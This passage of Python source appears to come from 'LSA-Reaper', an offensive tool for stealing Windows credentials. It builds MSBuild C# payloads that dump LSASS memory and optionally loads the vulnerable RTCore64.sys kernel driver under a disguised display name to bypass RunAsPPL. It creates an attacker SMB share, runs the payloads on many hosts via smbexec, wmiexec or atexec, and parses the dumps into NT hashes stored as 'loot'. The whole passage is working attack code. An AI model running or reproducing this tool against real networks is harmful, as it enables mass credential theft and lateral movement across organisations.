        xml_payload += '        public static int %s() {\n' % (GetMyPID)
        xml_payload += '            var %s = System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName);\n' % (myprocesses)
        xml_payload += '            var %s = 0;\n' % (myid)
        xml_payload += '            foreach (var %s in %s)\n' % (myprocess, myprocesses)
        xml_payload += '            {\n'
        xml_payload += '                %s = %s.Id;\n' % (myid, myprocess)
        xml_payload += '            }\n'
        xml_payload += '            return %s;\n' % (myid)
        xml_payload += '        }\n'

    xml_payload += '        public override bool Execute()\n'
    xml_payload += '		{\n'

    xml_payload += '            if (%s() == false)\n' % (IsAdministrator)
    xml_payload += '            {\n'
    xml_payload += '                Console.WriteLine("not runnin as admin");\n'
    xml_payload += '                return true;\n'
    xml_payload += '            }\n'

    xml_payload += '                var %s = System.IO.File.ReadLines("%s:\\\\%s.txt").ToArray();\n' % (lines, drive_letter, addresses_file)
    xml_payload += '                string %s = "";\n' % (thismachinesip)
    xml_payload += '                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n' % (ipEntry)
    xml_payload += '                foreach (var %s in %s.AddressList)\n' % (ip, ipEntry)
    xml_payload += '                {\n'
    xml_payload += '                    for (int %s = 0; %s < %s.Length; %s++)\n' % (i, i, lines, i)
    xml_payload += '                    {\n'
    xml_payload += '                        if (%s.ToString() == %s[%s].ToString())\n' % (ip, lines, i)
    xml_payload += '                        {\n'
    xml_payload += '                            %s = "-" + %s.ToString();\n' % (thismachinesip, ip)
    xml_payload += '                        }\n'
    xml_payload += '                    }\n'
    xml_payload += '                }\n'

    xml_payload += '            try\n'
    xml_payload += '            {\n'
    if runasppl:
        xml_payload += '                Process.Start("cmd.exe", @"/c " + "sc.exe create RTCore64 type=kernel start=auto binPath=%s:\\\\RTCore64.sys DisplayName=\\"Micro - Star MSI Afterburner\\"").WaitForExit();\n' % (drive_letter)
        xml_payload += '                Thread.Sleep(1000);\n'
        xml_payload += '                Process.Start("cmd.exe", @"/c " + "net start RTCore64").WaitForExit();\n'
        xml_payload += '                Thread.Sleep(1000);\n'
        xml_payload += '                runninit(%s().ToString());\n' % (GetMyPID)
        xml_payload += '                Thread.Sleep(1000);\n'
    xml_payload += '                Process[] %s = Process.GetProcessesByName("l" + "sa" + "ss");\n' % (process)
    xml_payload += '                using (FileStream %s = new FileStream("%s:\\\\" + System.Net.Dns.GetHostName() + %s +".dmp", FileMode.Create, FileAccess.ReadWrite, FileShare.Write))\n' % (fs, drive_letter, thismachinesip)
    xml_payload += '                {\n'
    xml_payload += '                    bool b = MiniDumpWriteDump(%s[0].Handle, (uint)%s[0].Id, %s.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);\n' % (process, process, fs)
    xml_payload += '                    if (!b){\n'
    xml_payload += '                        throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n'
    xml_payload += '                    }\n'
    xml_payload += '                }\n'

    if runasppl:
        xml_payload += '                Process.Start("cmd.exe", @"/c " + "net stop RTCore64").WaitForExit();\n'
        xml_payload += '                Process.Start("cmd.exe", @"/c " + "sc.exe delete RTCore64").WaitForExit();\n'

    xml_payload += '            }\n'
    xml_payload += '            catch (Exception)\n'
    xml_payload += '            {\n'
    xml_payload += '                Console.WriteLine("Error happened");\n'
    xml_payload += '                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n'
    xml_payload += '            }\n'

    xml_payload += '			return true;\n'
    xml_payload += '        }}\n'
    xml_payload += '                                ]]>\n'
    xml_payload += '                        </Code>\n'
    xml_payload += '                </Task>\n'
    xml_payload += '        </UsingTask>\n'
    xml_payload += '</Project>'

    with open('/var/tmp/{}/{}.xml'.format(share_name, payload_name), 'w') as f:
        f.write(xml_payload)
        f.close()
    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()

    if runasppl:
        os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, RunAsPPLDll))
        os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, RunAsPPLDll))

        os.system('sudo cp {}/src/RTCore64.sys /var/tmp/{}/RTCore64.sys'.format(cwd, share_name))
        os.system('sudo chmod uog+rx /var/tmp/{}/RTCore64.sys'.format(share_name))


def setup_share():
    if options.sharename is None:
        share_name = ''.join(random.choices(string.ascii_lowercase, k=20))
    else:
        share_name = options.sharename

    if options.shareuser is None:
        share_user = ''.join(random.choices(string.ascii_lowercase, k=10))
    else:
        share_user = options.shareuser

    if options.sharepassword is None:
        share_pass = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=35))
    else:
        share_pass = options.sharepassword

    if options.payloadname is None:
        payload_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    else:
        payload_name = options.payloadname

    if options.sharegroup is None:
        share_group = ''.join(random.choices(string.ascii_lowercase, k=10))
    else:
        share_group = options.sharegroup

    printnlog('\n[Generating share]')
    # making the directory
    printnlog('{} Creating the share folder'.format(green_plus))
    os.system('sudo mkdir /var/tmp/' + share_name)

    # smb.conf edits
    data = """[{}]
    path = /var/tmp/{}
    public = no
    force user = {}
    force group = {}
    browseable = yes
    create mask = 0664
    force create mode = 0664
    directory mask = 0775
    force directory mode = 0775
    read only = no
    comment = The share
    """.format(share_name, share_name, share_user, share_group)

    # copy old smb.conf file so its safe
    printnlog('{} Backing up the smb.conf file'.format(green_plus))
    os.system('sudo cp /etc/samba/smb.conf ' + cwd + "/")
    printnlog('{} Making modifications'.format(green_plus))
    with open('/etc/samba/smb.conf', 'a') as f:
        f.write(data)
        f.close()

    # create the user for the share
    # generate the group
    printnlog('{} Creating the group: {}'.format(green_plus, share_group))
    os.system('sudo groupadd --system ' + share_group)
    # make the user
    printnlog('{} Creating the user: {}'.format(green_plus, share_user))
    os.system('sudo useradd --system --no-create-home --group ' + share_group + " -s /bin/false " + share_user)
    # give the user access to the share folder
    printnlog('{} Giving the user rights'.format(green_plus))
    os.system('sudo chown -R ' + share_user + ":" + share_group + " /var/tmp/" + share_name)
    # expand access to the group
    printnlog('{} Giving the group rights'.format(green_plus))
    os.system('sudo chmod -R g+w /var/tmp/' + share_name)
    # create the smbusers password
    printnlog('{} Editing the SMB password'.format(green_plus))
    proc = subprocess.Popen(['sudo', 'smbpasswd', '-a', '-s', share_user], stdin=subprocess.PIPE)
    proc.communicate(input=share_pass.encode() + '\n'.encode() + share_pass.encode() + '\n'.encode())
    # restart the smb service
    printnlog('{}[+]{} Restarting the SMB service'.format(color_BLU, color_reset))
    os.system('sudo systemctl restart smbd')

    return share_name, share_user, share_pass, payload_name, share_group


def alt_exec():
    yes = input('Press enter to exit ')

    try:  # move the share file to the loot dir
        os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
        printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
    except BaseException as e:
        pass

    if options.ap:  # autoparse
        printnlog('\n[parsing files]')
        os.system('sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt'.format(cwd, timestamp, cwd, timestamp))
        os.system('sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep'.format(cwd, timestamp, cwd, timestamp))
        os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$\|::' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))

        remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
        if remove_files.lower() == 'y':
            os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))

    printnlog('\n{}[-]{} Cleaning up please wait'.format(color_BLU, color_reset))

    if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
        os.system('sudo rm {}/drives.txt'.format(cwd))

    try:
        os.system('sudo systemctl stop smbd')
        printnlog(green_plus + ' Stopped the smbd service')
    except BaseException as e:
        pass

    try:
        os.system('sudo cp ' + cwd + "/smb.conf /etc/samba/smb.conf")
        printnlog(green_plus + ' Cleaned up the smb.conf file')
    except BaseException as e:
        pass

    try:
        os.system('sudo rm ' + cwd + '/smb.conf')
    except BaseException as e:
        pass

    try:
        os.system('sudo userdel ' + share_user)
        printnlog(green_plus + ' Removed the user: ' + share_user)
    except BaseException as e:
        pass

    try:
        os.system('sudo groupdel ' + share_group)
        printnlog(green_plus + ' Removed the group: ' + share_group)
    except BaseException as e:
        pass

    try:
        os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
    except BaseException as e:
        pass

    print('{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
    sys.exit(0)


def exec_wmic(ip, domain):
    try:
        if options.method == 'wmiexec':
            executer = WMIEXEC('wmic logicaldisk get caption ', username, password, domain, options.hashes, options.aesKey, options.share,
                               False, options.k, options.dc_ip, 'cmd')
            executer.run(ip, False)
        elif options.method == 'smbexec':
            executer = CMDEXEC('wmic logicaldisk get caption ', username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
                               'C$', 445, options.service_name, 'cmd')
            executer.run(ip, ip)
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        lognoprint('{}: {}\n'.format(ip, str(e)))


def auto_drive(addresses, domain):  # really helpful so you dont have to know which drive letter to use
    printnlog('{}[+]{} Determining the best drive letter to use this may take a moment...'.format(color_BLU, color_reset))
    failed_logons = 0

    if len(addresses) > 2 and options.localauth == False:  # Anti lockout check
        for x in range(2):
            try:
                if options.method == 'wmiexec':
                    executer = WMIEXEC('wmic logicaldisk get caption ', username, password, domain, options.hashes, options.aesKey, options.share,
                                       False, options.k, options.dc_ip, 'cmd')
                    executer.run(addresses[x], False)
                elif options.method == 'smbexec':
                    executer = CMDEXEC('wmic logicaldisk get caption ', username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
                                       'C$', 445, options.service_name, 'cmd')
                    executer.run(addresses[x], addresses[x])

            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                lognoprint('{}: {}\n'.format(addresses[x], str(e)))

                if str(e).find('STATUS_LOGON_FAILURE') != -1 and options.localauth == False:  # way to track failed logins to see if they're gonna lock the account out
                    logging.error('{}: {}'.format(addresses[x], str(e)))
                    failed_logons += 1

                if failed_logons >= 2 and options.localauth == False:
                    cont = input('{}[!]{} Warning you got the user\'s password wrong on {} machines, you may lock the account out if the password is incorrect and you continue, please validate the password! Do you wish to continue? (y/N) '.format(color_YELL, color_reset, failed_logons))
                    if cont.lower() == 'n':
                        printnlog("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
                        try:
                            os.system('sudo systemctl stop smbd')
                            printnlog(green_plus + ' Stopped the smbd service')
                        except BaseException as e:
                            pass

                        try:
                            os.system('sudo cp ' + cwd + '{}/smb.conf /etc/samba/smb.conf')
                            printnlog(green_plus + ' Cleaned up the smb.conf file')
                        except BaseException as e:
                            pass

                        try:
                            os.system('sudo rm ' + cwd + '/smb.conf')
                        except BaseException as e:
                            pass

                        try:
                            os.system('sudo userdel ' + share_user)
                            printnlog(green_plus + ' Removed the user: ' + share_user)
                        except BaseException as e:
                            pass

                        try:
                            os.system('sudo groupdel ' + share_group)
                            printnlog(green_plus + ' Removed the group: ' + share_group)
                        except BaseException as e:
                            pass

                        try:
                            os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
                            printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
                        except BaseException as e:
                            pass

                        try:
                            os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
                        except BaseException as e:
                            pass

                        print('{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
                        sys.exit(0)
                continue
            # end of antilocout check

    if os.path.isfile('{}/drives.txt'.format(cwd)):  # incase they run with localauth to prevent file not found err
        os.system('sudo rm {}/drives.txt'.format(cwd))
    with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
        for ip in addresses:
            if options.localauth:
                domain = ip
            try:
                out = thread_exe.schedule(exec_wmic, (ip, domain,), timeout=25)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                lognoprint(str(e) + '\n')
                logging.error(str(e))
                continue
            except KeyboardInterrupt as e:
                continue
    outdata = []
    try:
        data = ''  # read data that was saved to drives.txt into data
        with open('{}/drives.txt'.format(cwd), 'r') as f:
            data = f.read()
            f.close()
        outdata = re.findall('[A-Z]', data)  # rip out all the A: C: drive letters

    except BaseException as e:
        pass

    inuse_driveletters = []
    for letter in outdata:
        if letter not in inuse_driveletters:
            inuse_driveletters.append(letter)

    if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
        os.system('sudo rm {}/drives.txt'.format(cwd))

    for item in list(map(chr, range(ord('A'), ord('Z') + 1))):
        if item not in inuse_driveletters and item != 'C' and item != 'D':
            return item

    least_common = collections.Counter(cleaned_outdata).most_common()[-1]
    printnlog('{}[!]{} Between every machine all drive letters are in use'.format(color_YELL, color_reset))
    printnlog('{}[*]{} The least used drive letter is {}: it is available on {}/{} machines\n'.format(color_BLU, color_reset, least_common[0], (len(addresses) - least_common[1]), len(addresses)))

    yn = input('Would you like to use {}: as the drive letter if not we exit ps. the program will hang on the machines that have the drive mounted (y/N) '.format(least_common[0]))
    if yn.lower() == 'y':
        return least_common[0]
    else:
        sys.exit(0)


def mt_execute(ip, count):  # multithreading requires a function
    printnlog('{} Attacking {}'.format(green_plus, ip))
    try:
        if options.method == 'wmiexec':
            executer = WMIEXEC(command, username, password, domain, options.hashes, options.aesKey, options.share, False, options.k, options.dc_ip, 'cmd')
            executer.run(ip, False)
        elif options.method == 'atexec':
            atsvc_exec = TSCH_EXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, command, None, False)
            atsvc_exec.play(ip)
        elif options.method == 'smbexec':
            executer = CMDEXEC(command, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
                               options.share, 445, options.service_name, 'cmd')
            executer.run(ip, ip)
        printnlog("{} {}: Completed".format(green_plus, ip))
        if count % options.threads == 0:
            printnlog('{}[+]{} {}% Complete'.format(color_YELL, color_reset, str(round((count / len(addresses)) * 100, 2))))
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        lognoprint('{}: {}\n'.format(ip, str(e)))
        logging.error('{}: {}'.format(ip, str(e)))
        if count % options.threads == 0:
            printnlog('{}[+]{} {}% Complete'.format(color_YELL, color_reset, str(round((count / len(addresses)) * 100, 2))))
        pass


def port445_check(interface_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind((interface_ip, 445))
    except socket.error as e:
        if e.errno == errno.EADDRINUSE:
            printnlog('{} Port 445 is already in use'.format(red_minus))
            sys.exit(0)
        else:
            # something else raised the socket.error exception
            printnlog(str(e))

    sock.close()


def update_chk():
    try:
        printnlog('{}Checking for updates{}'.format(color_YELL, color_reset))
        req = requests.get('https://raw.githubusercontent.com/samiam1086/LSA-Reaper/main/lsa-reaper.py', timeout=5)
        reqhash = hashlib.sha256(req.content).hexdigest()

        with open(__file__, 'rb') as f:
            dat = f.read()
            f.close
        localhash = hashlib.sha256(dat).hexdigest()

        if localhash != reqhash:
            printnlog('{}WARNING Your LSA-Reaper is out of date{}\n'.format(color_YELL, color_reset))
    except KeyboardInterrupt as e:
        printnlog('{}Ctrl C detected skipping{}'.format(color_YELL, color_reset))
        pass
    except:
        printnlog('{}Unable to check for updates{}\n'.format(color_YELL, color_reset))
        pass

def apt_package_chk():
    errors = False
    cache = apt.Cache()
    try:
        if cache['samba'].is_installed:
            pass
        else:
            print(color_RED + '[!] ERROR: samba is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install samba -y')
            errors = True
    except ValueError:
        print(color_RED + '[!] ERROR: samba is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install samba -y')
        errors = True

    try:
        if cache['mono-complete'].is_installed:
            pass
        else:
            print(color_RED + '[!] ERROR: mono-complete is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install mono-complete -y')
            errors = True
    except ValueError:
        print(color_RED + '[!] ERROR: samono-completemba is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install mono-complete -y')
        errors = True

    if errors:
        sys.exit(1)

# Process command-line arguments.
if __name__ == '__main__':
    # quick checks to see if were good
    if sys.platform != 'linux':
        printnlog('[!] This program is Linux only')
        sys.exit(1)

    if os.path.isdir('{}/loot'.format(cwd)) == False:
        os.makedirs('{}/loot'.format(cwd))

    if os.path.isfile('{}/indivlog.txt'.format(cwd)):
        os.system('sudo rm {}/indivlog.txt'.format(cwd))

    printnlog(reaper_banner)
    if '-sku' not in sys.argv:
        update_chk()
    apt_package_chk()
    printnlog(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description='', epilog='Methods:\n smbexec: Impacket\'s smbexec that has been modified to work a little better it is the most consistent and clean working\n wmiexec: Impacket\'s wmiexec that has been modified to work with Reaper the only artifact it leaves is a dead SMB connection if the payload does not fully execute\n atexec:  Impacket\'s atexec it works sometimes\n\nPayloads:\n  Payloads are formatted in execmode-payloadtype\n  msbuild:     Abuses MsBuild v4.0+\'s ability to run inline tasks via an xml payload to execute C# code\n  regsvr32:    Abuses RegSvr32\'s ability to execute a dll to execute code\n  dllsideload: Abuses Windows 7 calc.exe to sideload a dll to gain code execution\n  exe:         Pretty self explanatory it\'s an exe that runs\n  Payloads ending in mdwd use a simple MiniDumpWriteDump function to dump lsass\n  Payloads ending in mdwdpss use PssCaptureSnapshot to copy lsass memory to a new process and dump that with MiniDumpWriteDump', formatter_class=RawTextHelpFormatter)
    if '-oe' not in sys.argv:  # if were using another exec method we dont need to get target
        parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, range, cidr>')
    parser.add_argument('-share', action='store', default='C$', choices=['C$', 'ADMIN$'], help='share where the output will be grabbed from (default C$ for smbexec, ADMIN$ for wmiexec) (wmiexec and smbexec ONLY)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-sku', action='store_true', help='Skips the update check (good for if you do not have internet and dont want to wait for it to timeout)')
    parser.add_argument('-oe', action='store_true', default=False, help='Pause just before the execution of the payload (Good for when you want to execute the payload using other methods)')
    parser.add_argument('-ap', action='store_true', default=False, help='Turn auto parsing of .dmp files ON this will parse the .dmp files into dumped_full.txt, dumped_full_grep.grep, and dumped_msv.txt')
    parser.add_argument('-av', action='store_true', default=False, help='Turn auto validation of found accounts ON this will try to authenticate to a domain controller using any usernames and NT hashes that were found (Requires -ap)')
    parser.add_argument('-sh', action='store_true', default=False, help='Skips any hosts that have been previously attacked. (Stored in hist file)')
    parser.add_argument('-drive', action='store', help='Set the drive letter for the remote device to connect with')
    parser.add_argument('-threads', action='store', type=int, default=5, help='Set the maximum number of threads default=5')
    parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
    parser.add_argument('-method', action='store', default='smbexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
    parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild', 'regsvr32-mdwdpss', 'regsvr32-mdwd', 'dllsideload-mdwdpss', 'dllsideload-mdwd', 'exe-mdwdpss', 'exe-mdwd'], help='Choose a payload type')
    parser.add_argument('-payloadname', action='store', help='Set the name for the payload file Default=random')
    parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
    parser.add_argument('-runasppl', action='store_true', default=False, help='Attempts to bypass RunAsPPL (WARNING THIS USES A SYSTEM DRIVER AND INTERACTS AT A KERNEL LEVEL DO NOT USE IN PROD)')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ' % CODEC)
    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION", help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
    parser.add_argument('-service-name', action='store', metavar="service_name", default=SERVICE_NAME, help='The name of the service used to trigger the payload (SMBEXEC only)')

    parser.add_argument('-sharename', action='store', help='Set the name of the attacker share Default=random')
    parser.add_argument('-shareuser', action='store', help='Set the username of the user for the share Default=random')
    parser.add_argument('-sharepassword', action='store', help='Set the password for shareuser Default=random')
    parser.add_argument('-sharegroup', action='store', help='Set the group for shareuser Default=random')

    group = parser.add_argument_group('authentication')
    group.add_argument('-localauth', action='store_true', default=False, help='Authenticate with a local account to the machine')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH or just NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-A', action="store", metavar="authfile", help="smbclient/mount.cifs-style authentication file. "
                                                                      "See smbclient man page's -A option.")
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    if os.geteuid() != 0:
        printnlog('[!] Must be run as sudo')
        sys.exit(1)

    options = parser.parse_args()

    if options.debug:
        lognoprint('{}Command:{} '.format(color_PURP, color_reset) + ' '.join(sys.argv) + '\n')

    # Init the example's logger theme
    logger.init(options.ts)

    #if '-share' not in sys.argv and options.method == 'wmiexec':  # ADMIN$ is the default share for wmiexec wheres C$ is the default for smbexec and we need a way to determine if the user has not provided on to used the default for this
        #options.share = 'ADMIN$' # ADMIN$ has been getting flaged as malware with wmiexec so moving it to default to C$

    if options.runasppl and options.method != 'smbexec':  # check to see if they are trying to run runasppl bypass with something other than smbexec
        printnlog('{}[!]{} RunAsPPL Bypass only works with the SMBExec method'.format(color_RED, color_reset))
        sys.exit(0)

    if options.runasppl and options.payload != "msbuild":  # check to see if the user is trying to run the runasppl bypass with a payload other than msbuild
        printnlog('{}[!]{} RunAsPPL Bypass only works with the MsBuild payload'.format(color_RED, color_reset))
        sys.exit(0)

    if options.runasppl:
        if options.debug == False:
            printnlog('I HIGHLY recommend turning on -debug')
        plzno = input('{}[!]{} RunAsPPL Bypass uses a kernel driver which theoretically can cause a BSOD are you absolutely sure you want to use this? Also this only works every other time (y/N): '.format(color_YELL, color_reset))
        if plzno.lower() != 'y':
            sys.exit(0)

    if options.payload == 'dllsideload' and options.method == 'wmiexec':
        cont = input('{}[!]{} Warning you are attempting to run dllsideload via wmiexec which will work, however it will hang until timeout do you want to (c)ontinue, (n)o exit, or (y)es switch to smbexec: '.format(color_YELL, color_reset))
        if cont.lower() == 'n':
            sys.exit(0)
        elif cont.lower() == 'y':
            options.method = 'smbexec'

    if options.codec is not None:
        CODEC = options.codec
    else:
        if CODEC is None:
            CODEC = 'utf-8'

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error('Wrong COMVERSION format, use dot separated integers e.g. "5.7"')
            sys.exit(1)

    if '-oe' in sys.argv:
        options.target = 'eriujf/eriuhe:\'rguire\'@1'

    domain, username, password, address = parse_target(options.target)

    try:
        if options.A is not None:
            (domain, username, password) = load_smbclient_auth_file(options.A)
            logging.debug('loaded smbclient auth file: domain=%s, username=%s, password=%s' % (
                repr(domain), repr(username), repr(password)))

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass('Password:')

        if options.aesKey is not None:
            options.k = True

        if options.drive is not None and options.drive.isalpha() and len(options.drive) == 1:  # did we get a drive letter?
            drive_letter = str(options.drive).upper()
        else:
            drive_letter = 'Q'

        if options.hashes is not None and options.hashes.find(':') == -1:  # quick check to prevent formatting error with hashes
            options.hashes = ':{}'.format(options.hashes)

        if options.ip is not None:  # did they give us the local ip in the command line
            local_ip = options.ip
            ifaces = ni.interfaces()
            try:  # check to see if the interface has an ip
                if local_ip in ifaces:
                    local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                    printnlog('local IP => ' + local_ip)
            except BaseException as exc:
                printnlog('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
                sys.exit(0)
        else:
            # print local interfaces and ips
            print('')
            ifaces = ni.interfaces()
            for face in ifaces:
                try:  # check to see if the interface has an ip
                    printnlog('{} {}'.format(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr']))
                except BaseException as exc:
                    continue

            local_ip = input('\nEnter you local ip or interface: ')

            # lets you enter eth0 as the ip
            if local_ip in ifaces:
                local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                printnlog('local IP => ' + local_ip)

        port445_check(local_ip)  # check if port 445 is in use

        if '-oe' not in sys.argv:  # why scan if we not gonna do anything
            addresses = do_ip(address, local_ip)  # gets a list of up hosts

            if len(addresses) < 1:  # ensure that there are targets otherwise whats the point
                printnlog('{}[!]{} There are no targets up or the provided list is empty.'.format(color_RED, color_reset))
                sys.exit(0)

            if os.path.isfile('{}/hist'.format(cwd)):
                if options.sh:
                    with open('{}/hist'.format(cwd), 'r') as f:  # read this history file to an array
                        history_ips = f.readlines()
                        f.close()
                    history_ips_cleaned = []
                    for item in history_ips:  # remove \r and \n
                        item = item.replace("\r", "")
                        history_ips_cleaned.append(item.replace("\n", ""))

                    skipped_count = 0
                    ips_to_remove = []
                    for currip in addresses:
                        if currip in history_ips_cleaned:
                            ips_to_remove.append(currip)  # need to pass it to an array first because if we just remove from the array we will skip every other one
                            skipped_count += 1

                    if skipped_count > 0:  # first check to see if we did get any to remove if so remove them from addresses
                        for eachip in ips_to_remove:
                            addresses.remove(eachip)

                    printnlog('{}[+]{} Skipped {} hosts from history'.format(color_BLU, color_reset, skipped_count))
                    lognoprint('Skipped hosts: {}'.format(ips_to_remove))

            with open('{}/hist'.format(cwd), 'a') as f:
                for currip in addresses:
                    f.write(currip + '\n')

            if len(addresses) < 1:  # ensure that there are targets otherwise whats the point
                printnlog('{}[!]{} There are no targets up or the provided list is empty or you skipped all of the targets from previous history.'.format(color_RED, color_reset))
                sys.exit(0)

            if len(addresses) > 500:  # ensure that they dont waste over 25 gb of storage
                printnlog('\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? '.format(str(len(addresses)), str((len(addresses) * 52) / 1024)))
                choice = input("(N/y): ")
                if choice.lower() == 'n':
                    sys.exit(0)

        share_name, share_user, share_pass, payload_name, share_group = setup_share()  # creates and starts our share
        printnlog('\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n'.format(share_name, share_user, share_pass))

        # automatically find the best drive to use
        if options.drive is None and (options.method == 'wmiexec' or options.method == 'smbexec') and options.oe == False:
            drive_letter = auto_drive(addresses, domain)

        if options.oe:  # This is so that if you are using -oe the payload has an address in the file that it checks for the output naming convention of hotname-ip.dmp otherwise it will error
            addresses = ['23423.5463.1234.3465']

        if options.payload == 'msbuild':
            gen_payload_msbuild(share_name, payload_name, drive_letter, addresses, options.runasppl)  # creates the payload
        elif options.payload == 'regsvr32-mdwdpss':
            addresses_file = gen_payload_regsvr32_pss(share_name, payload_name, addresses)
        elif options.payload == 'exe-mdwdpss':
            gen_payload_exe_pss(share_name, payload_name, addresses, drive_letter)
        elif options.payload == 'dllsideload-mdwdpss':
            gen_payload_dllsideload_pss(share_name, addresses)
        elif options.payload == 'exe-mdwd':
            gen_payload_exe_mdwd(share_name, payload_name, addresses, drive_letter)
        elif options.payload == 'dllsideload-mdwd':
            gen_payload_dllsideload_mdwd(share_name, addresses)
        elif options.payload == 'regsvr32-mdwd':
            addresses_file = gen_payload_regsvr32_mdwd(share_name, payload_name, addresses)

        if not options.oe:
            printnlog('\n[This is where the fun begins]\n{} Executing {} via {}\n'.format(green_plus, options.payload, options.method))

        if options.payload == 'msbuild':
            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
        elif options.payload == 'regsvr32-mdwdpss' or options.payload == 'regsvr32-mdwd':
